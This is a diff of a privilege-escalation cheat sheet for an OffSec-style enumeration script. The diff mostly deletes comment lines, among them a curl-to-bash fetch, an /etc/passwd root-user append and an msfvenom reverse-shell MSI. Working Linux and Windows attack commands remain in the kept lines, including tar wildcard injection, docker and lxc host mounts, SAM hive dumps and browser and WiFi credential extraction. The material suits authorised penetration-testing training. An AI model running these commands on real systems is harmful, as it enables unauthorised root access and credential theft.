@@ -29,12 +29,6 @@ Privilege escalation enumeration orchestrator for OffSec. Run it on Kali after y
 ./escalatr.sh 10.10.10.1 --os linux
 ./escalatr.sh 10.10.10.1 --os windows
 
-# 3. Script prints [NEXT STEPS] block — follow it in order:
-#    a. Start listener (printed first):
-#       penelope -p 4444 -O
-#    b. Transfer tools — commands are auto-resolved with your tun0/eth0 IP and HTTP port:
-#       curl http://<your-kali-ip>:<port>/linpeas.sh | bash   # Linux
-#       iwr -uri http://<your-kali-ip>:<port>/winpeas.exe ... # Windows
 #    c. Run commands.txt on target, exfil output, then parse:
 ./escalatr.sh --parse /tmp/linpeas_output.txt
 ./escalatr.sh --parse /tmp/winpeas_output.txt --os windows
@@ -268,21 +262,13 @@ whoami; whoami /priv; whoami /groups; hostname; systeminfo
 ```powershell
 # Token privileges — #1 Windows OffSec vector
 whoami /priv
-# SeImpersonatePrivilege → potato (see guide below)
-# SeBackupPrivilege      → reg save hklm\sam → secretsdump
-# SeDebugPrivilege       → procdump lsass → mimikatz offline
-
 # Stored credentials
 cmdkey /list
-# If entries → runas /savecred /user:DOMAIN\admin cmd.exe
-
 # PowerShell history (ALWAYS check)
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 
 # Service misconfigurations
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'}
-# Check permissions: icacls "C:\path\to\service.exe"  (F or M for Users = writable)
-
 # Unquoted service paths (cmd.exe)
 wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\" | findstr /i /v """"
 
@@ -473,10 +459,6 @@ rm -rf ~/.offsec_tools/privesc/
 ```bash
 sudo -l                                            # what can this user run as root?
 
-# If you see (ALL) NOPASSWD: /usr/bin/find or similar GTFOBins entries:
-# https://gtfobins.github.io/ — look up the binary
-
-# If sudo requires a password you don't have — try any password you've found
 # (people reuse their login password for sudo)
 sudo su
 sudo bash
@@ -490,18 +472,12 @@ sudoedit -s '\' $(python3 -c "print('A'*65536)")
 find / -perm -u=s -type f 2>/dev/null             # SUID
 find / -perm -g=s -type f 2>/dev/null             # SGID
 
-# Cross-reference against GTFOBins for each non-standard binary
 # Common engagement finds: pkexec, vim, nmap, python, bash, find, less, more, man, awk
 ```
 
 **Linux capabilities (often missed by linpeas):**
 ```bash
 getcap -r / 2>/dev/null
-# Dangerous caps: cap_setuid, cap_net_raw, cap_dac_override, cap_sys_admin
-
-# Example: python3 with cap_setuid
-# python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
-# Example: openssl with cap_setuid
 # openssl req -engine ./engine.so               # needs a crafted .so
 ```
 
@@ -512,20 +488,16 @@ find / -writable -user root -type f 2>/dev/null | grep -v proc | grep -v sys
 
 # Writable /etc/passwd (direct root add)
 ls -la /etc/passwd
-# If writable: echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd && su pwned
-
 # Writable /etc/cron* or cron jobs that run writable scripts
 ls -la /etc/cron* /var/spool/cron/ 2>/dev/null
 cat /etc/crontab
 crontab -l
 
-# Writable script called by a root cron job
 # Find the job → find the script → write a reverse shell to it → wait
 ```
 
 **Wildcard injection in cron jobs:**
 ```bash
-# If a cron runs: cd /some/dir && tar czf backup.tar.gz *
 # Create files with option-like names:
 touch /some/dir/'--checkpoint=1'
 touch /some/dir/'--checkpoint-action=exec=sh shell.sh'
@@ -537,7 +509,6 @@ chmod +x /some/dir/shell.sh
 **PATH hijacking:**
 ```bash
 echo $PATH
-# If writable dir appears before /usr/bin in PATH:
 # Find what root scripts call without absolute paths
 strings /usr/local/bin/custom_script 2>/dev/null | grep -v '/'
 # Create a fake binary with that name in the writable dir
@@ -570,7 +541,6 @@ docker run -it -v /:/mnt alpine chroot /mnt
 # If docker is available:
 docker run -it --rm -v /:/host ubuntu chroot /host /bin/bash
 
-# LXD/LXC group → instant root
 # Build a container, mount host filesystem
 lxc init ubuntu:18.04 privesc -c security.privileged=true
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
@@ -584,7 +554,6 @@ ss -tlnp                                           # all listeners
 ss -ulnp                                           # UDP listeners
 netstat -tlnp 2>/dev/null
 
-# If something on 127.0.0.1:PORT — forward it to yourself
 # On target:
 ssh -L 8888:127.0.0.1:PORT user@KALI              # forward to Kali
 # Or use chisel:
@@ -629,9 +598,6 @@ whoami /priv
 mkdir C:\Temp\hive
 reg save HKLM\SAM C:\Temp\hive\sam.hive
 reg save HKLM\SYSTEM C:\Temp\hive\system.hive
-# Transfer to Kali → impacket-secretsdump -sam sam.hive -system system.hive LOCAL
-
-# SeRestorePrivilege → overwrite any file
 # SeDebugPrivilege → dump lsass (Mimikatz)
 ```
 
@@ -646,9 +612,6 @@ cmdkey /list
 # AlwaysInstallElevated (both keys must be 1)
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-# If both 1: msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f msi > evil.msi
-# msiexec /quiet /qn /i evil.msi
-
 # Autorun keys — writable?
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
 reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
@@ -671,10 +634,6 @@ Get-Service | Where-Object {$_.Status -eq 'Running'} | ForEach-Object {
   Write-Host "$($svc.Name): $path"
 }
 
-# Use Procmon (if available) to watch DLL loads:
-# Filter: Process Name = target.exe, Result = NAME NOT FOUND, Path ends with .dll
-# If the missing DLL's load path is writable → drop your own DLL there
-
 # Manual check: if a service loads DLLs from its own dir and that dir is writable:
 icacls "C:\Program Files\SomeApp\"               # check write perms
 # Create a DLL with the missing name, restart service
@@ -694,8 +653,6 @@ copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" C:\Temp\
 
 # Windows Credential Manager
 rundll32.exe keymgr.dll, KRShowKeyMgr            # GUI
-# Or: use Mimikatz → vault::list
-
 # WiFi passwords (requires admin)
 netsh wlan show profiles
 netsh wlan show profile "NetworkName" key=clear  # shows PSK
@@ -727,8 +684,6 @@ nxc ldap DC_IP -u USER -p PASS -M laps
 
 - [[Linux_PrivEsc]] — manual Linux privesc techniques
 - [[Windows_PrivEsc]] — manual Windows privesc techniques
-- [[OffSec_Linux_PrivEsc_Field_Notes]] — engagement Linux privesc reference
-- [[OffSec_Windows_PrivEsc_Field_Notes]] — engagement Windows privesc reference
 - [[File_Transfers]] — transferring tools when HTTP fails
 - [[Passwords]] — cracking hashes found during enumeration
 - [[Tunneling_Pivoting]] — port forwarding internal listeners
